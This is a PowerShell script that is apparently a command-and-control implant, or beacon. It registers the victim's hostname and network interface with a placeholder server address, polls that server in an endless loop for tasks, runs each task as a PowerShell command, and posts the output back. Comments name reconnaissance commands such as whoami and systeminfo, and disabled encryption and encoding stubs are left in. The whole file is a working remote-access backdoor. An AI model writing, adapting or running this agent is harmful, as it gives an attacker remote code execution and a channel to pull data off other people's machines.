# function shell($fname, $arg){
    
#     $pinfo                        = New-Object System.Diagnostics.ProcessStartInfo
#     $pinfo.FileName               = $fname
#     $pinfo.RedirectStandardError  = $true
#     $pinfo.RedirectStandardOutput = $true
#     $pinfo.UseShellExecute        = $false
#     $pinfo.Arguments              = $arg
#     $p                            = New-Object System.Diagnostics.Process
#     $p.StartInfo                  = $pinfo
    
#     $p.Start() | Out-Null
#     $p.WaitForExit()
    
#     $stdout = $p.StandardOutput.ReadToEnd()
#     $stderr = $p.StandardError.ReadToEnd()

#     $res = "VALID $stdout`n$stderr"
#     $res
# }


function Invoke-Executable {
    # Runs the specified executable and captures its exit code, stdout
    # and stderr.
    # Returns: custom object.
    param(
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]$sExeFile,
        [Parameter(Mandatory=$false)]
        [String[]]$cArgs,
        [Parameter(Mandatory=$false)]
        [String]$sVerb
    )

    # Setting process invocation parameters.
    $oPsi = New-Object -TypeName System.Diagnostics.ProcessStartInfo
    $oPsi.CreateNoWindow = $true
    $oPsi.UseShellExecute = $false
    $oPsi.RedirectStandardOutput = $true
    $oPsi.RedirectStandardError = $true
    $oPsi.FileName = $sExeFile
    if (! [String]::IsNullOrEmpty($cArgs)) {
        $oPsi.Arguments = $cArgs
    }
    if (! [String]::IsNullOrEmpty($sVerb)) {
        $oPsi.Verb = $sVerb
    }

    # Creating process object.
    $oProcess = New-Object -TypeName System.Diagnostics.Process
    $oProcess.StartInfo = $oPsi

    # Creating string builders to store stdout and stderr.
    $oStdOutBuilder = New-Object -TypeName System.Text.StringBuilder
    $oStdErrBuilder = New-Object -TypeName System.Text.StringBuilder

    # Adding event handers for stdout and stderr.
    $sScripBlock = {
        if (! [String]::IsNullOrEmpty($EventArgs.Data)) {
            $Event.MessageData.AppendLine($EventArgs.Data)
        }
    }
    $oStdOutEvent = Register-ObjectEvent -InputObject $oProcess `
        -Action $sScripBlock -EventName 'OutputDataReceived' `
        -MessageData $oStdOutBuilder
    $oStdErrEvent = Register-ObjectEvent -InputObject $oProcess `
        -Action $sScripBlock -EventName 'ErrorDataReceived' `
        -MessageData $oStdErrBuilder

    # Starting process.
    [Void]$oProcess.Start()
    $oProcess.BeginOutputReadLine()
    $oProcess.BeginErrorReadLine()
    [Void]$oProcess.WaitForExit()

    # Unregistering events to retrieve process output.
    Unregister-Event -SourceIdentifier $oStdOutEvent.Name
    Unregister-Event -SourceIdentifier $oStdErrEvent.Name

    $oResult = New-Object -TypeName PSObject -Property ([Ordered]@{
        "ExeFile"  = $sExeFile;
        "Args"     = $cArgs -join " ";
        "ExitCode" = $oProcess.ExitCode;
        "StdOut"   = $oStdOutBuilder.ToString().Trim();
        "StdErr"   = $oStdErrBuilder.ToString().Trim()
    })

    return $oResult
}

#Invoke-Executable -sExeFile 'powershell' -cArgs @('/c', 'systeminfo')



$hostname = [System.Net.Dns]::GetHostName()
# $username = $env:UserDomain
$ip   = "REPLACE_IP"
$port = "REPLACE_PORT"
$interface = "REPLACE_INTERFACE"
# $key  = "REPLACE_KEY"
$n    = 3

$regl  = ("http" + ':' + "//$ip" + ':' + "$port/reg/")
$data  = @{
    eth = "$interface" 
    hname = "$hostname"
    # username="$username"
    }
    
$name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
#name= SDFCXS

$taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name/")
$resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/$name/")
#http://1.1.1.1:1233/tasks/demo


for (;;){
    
    $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
    #whoami;systeminfo;ech
    
    if (-Not [string]::IsNullOrEmpty($task)){
        
        # $task = Decrypt $key $task
    # $task = $task.split()  # task=['VALID','shell','dir']
        # $arguments   = $task[0..$task.Length]
    
        # foreach ($a in $arguments){ $arg += $a + " " }

        # $res  = shell $f $arg

        # $Bytes = [System.Text.Encoding]::Unicode.GetBytes($res)
        # $EncodedText =[Convert]::ToBase64String($Bytes)
        # $res  = Encrypt $key $res
        # $encodedURL = [System.Web.HttpUtility]::UrlEncode($EncodedText) 
        $result = Invoke-Executable -sExeFile 'powershell' -cArgs @('/c', $task)
        # $Bytes = [System.Text.Encoding]::Unicode.GetBytes($result)
        # $EncodedText =[Convert]::ToBase64String($Bytes)
        $data = @{result = "$result"}
        
        Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
        #http://192.168.71.142:8000/results/GTLBHU/

        sleep $n
    }
}

